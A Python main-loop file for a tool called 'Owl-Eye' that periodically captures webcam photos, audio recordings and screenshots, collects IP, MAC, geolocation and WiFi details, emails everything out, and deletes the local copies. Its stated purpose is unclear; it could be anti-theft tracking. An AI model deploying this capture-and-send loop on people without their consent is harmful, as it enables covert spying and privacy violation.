import time
import signal
import os
from owl_eye.logger import setup_logger
from owl_eye.utils import system_info, capture, screenshot, mailer
from owl_eye.config.config import CAPTURE_INTERVAL

logger = setup_logger()
running = True

def signal_handler(sig, frame):
    global running
    logger.info("Shutting down...")
    running = False

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def main_loop():
    logger.info("Owl-Eye started")
    while running:
        
        try:
            time.sleep(CAPTURE_INTERVAL)

            photo_file = capture.take_photo()
            audio_file = capture.record_audio()
            screenshot_file = screenshot.take_screenshot()

            body = (
                f"IP: {system_info.get_ip_address()}\n"
                f"MAC: {system_info.get_mac_address()}\n"
                f"Location: {system_info.get_geolocation()}\n"
                f"WiFi SSID: {system_info.get_wifi_ssid()}\n"
            )

            attachments = []
            if photo_file: attachments.append(photo_file)
            if audio_file: attachments.append(audio_file)
            if screenshot_file: attachments.append(screenshot_file)

            if attachments or body:
                success = mailer.send_email("Owl-Eye Update", body, attachments)
                if success:
                    logger.info(f"Email sent successfully")
                else:
                    logger.error("Failed to send email")

            # Clean up
            for file in attachments:
                if file and os.path.exists(file):
                    os.remove(file)

        except Exception as e:
            logger.exception(f"Error in main loop: {e}")
            time.sleep(CAPTURE_INTERVAL)

if __name__ == "__main__":
    main_loop()
